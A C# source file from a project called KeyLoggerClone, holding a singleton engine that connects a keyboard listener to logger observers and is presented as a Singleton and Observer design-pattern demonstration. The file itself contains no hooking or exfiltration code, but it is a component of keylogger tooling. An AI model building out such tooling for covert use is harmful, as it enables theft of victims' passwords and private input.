using System;
using System.Collections.Generic;
using KeyLoggerClone.Core;
using KeyLoggerClone.Listeners;
using KeyLoggerClone.Loggers;

namespace KeyLoggerClone.Engine
{
    /// <summary>
    /// Coordinates the keyboard listener and logger instances.
    /// Demonstrates the Singleton and Observer Design Patterns.
    /// </summary>
    public class KeyloggerEngine
    {
        private static KeyloggerEngine _instance;
        private static readonly object Padlock = new object();

        private IKeyboardListener _listener;
        private readonly List<ILogger> _loggers = new List<ILogger>();

        /// <summary>
        /// Singleton instance accessor.
        /// </summary>
        public static KeyloggerEngine Instance
        {
            get
            {
                lock (Padlock)
                {
                    return _instance ??= new KeyloggerEngine();
                }
            }
        }

        private KeyloggerEngine()
        {
        }

        public bool IsRunning => _listener?.IsRunning ?? false;

        /// <summary>
        /// Registers a logger to receive intercepted keystrokes.
        /// </summary>
        public void RegisterLogger(ILogger logger)
        {
            lock (_loggers)
            {
                if (!_loggers.Contains(logger))
                {
                    _loggers.Add(logger);
                }
            }
        }

        /// <summary>
        /// Unregisters a logger.
        /// </summary>
        public void UnregisterLogger(ILogger logger)
        {
            lock (_loggers)
            {
                if (_loggers.Contains(logger))
                {
                    _loggers.Remove(logger);
                }
            }
        }

        /// <summary>
        /// Clears all registered loggers.
        /// </summary>
        public void ClearLoggers()
        {
            lock (_loggers)
            {
                _loggers.Clear();
            }
        }

        /// <summary>
        /// Starts the keylogger engine with the specified listener.
        /// </summary>
        public void Start(IKeyboardListener listener)
        {
            if (IsRunning) return;

            _listener = listener ?? throw new ArgumentNullException(nameof(listener));
            _listener.KeyIntercepted += OnKeyIntercepted;
            _listener.Start();
        }

        /// <summary>
        /// Stops the keylogger engine.
        /// </summary>
        public void Stop()
        {
            if (!IsRunning) return;

            _listener.Stop();
            _listener.KeyIntercepted -= OnKeyIntercepted;
            _listener.Dispose();
            _listener = null;

            // Flush all loggers to ensure no buffered data remains
            lock (_loggers)
            {
                foreach (var logger in _loggers)
                {
                    logger.Flush();
                }
            }
        }

        private void OnKeyIntercepted(object sender, KeyInterceptedEventArgs e)
        {
            // Multiplex keystroke events to all observers (Loggers)
            lock (_loggers)
            {
                foreach (var logger in _loggers)
                {
                    logger.Log(e);
                }
            }
        }
    }
}
